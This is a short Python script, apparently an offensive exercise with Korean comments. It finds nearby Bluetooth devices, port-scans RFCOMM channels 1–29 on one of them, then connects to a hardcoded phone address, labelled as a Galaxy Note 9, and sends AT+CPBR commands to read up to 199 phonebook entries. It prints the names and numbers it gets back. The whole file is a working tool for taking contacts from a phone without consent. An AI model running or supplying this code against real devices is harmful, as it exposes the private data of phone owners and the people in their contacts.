#-*- coding:utf8 -*-
from bluetooth import *

alreadyFound = []

foundDevs = discover_devices(lookup_names=True)

# 연결 가능한 블루투스 장치 찾기
for (addr, name) in foundDevs:
    if addr not in alreadyFound:
        print("[*] Found Bluetooth Device :"+str(name) +" " +str(addr))
        alreadyFound.append(addr)

def rfcommCon(addr,port):
    sock = BluetoothSocket(RFCOMM)
    try:
        sock.connect((addr,port))
        print("[+] RFCOMM Port "+str(port) + " open")
        sock.close()
    except Exception as e :
        print("[-] RCOMM PORT "+str(port) +" close")

for x in range(1,30):
    rfcommCon(alreadyFound[0],x)

address = []

# Galaxy Note 9 Connect Setup
tgtPhone = '08:AE:D6:E7:ED:14'
port = 2

phoneSock = BluetoothSocket(RFCOMM)
phoneSock.connect((tgtPhone,port))
# for x in range(0, len(alreadyFound)):
#     phoneSock.connect((tgtPhone, port))

for contact in range(1, 200):
    atCmd = "AT+CPBR=" + str(contact) + "\n"
    phoneSock.send(atCmd)
    result = phoneSock.recv(1024)
    result = result.decode().replace("\r\n", "").split(",")
    try:
        PhonNumber, name = result[1], result[3]
        address.append([PhonNumber, name])
    except Exception as e:
        pass

for x in range(1, len(address)):
    try:
        if address[x - 1][0] in address[x][0]:
            del address[x]
    except:
        pass

for x in address:
    print(x)

phoneSock.close()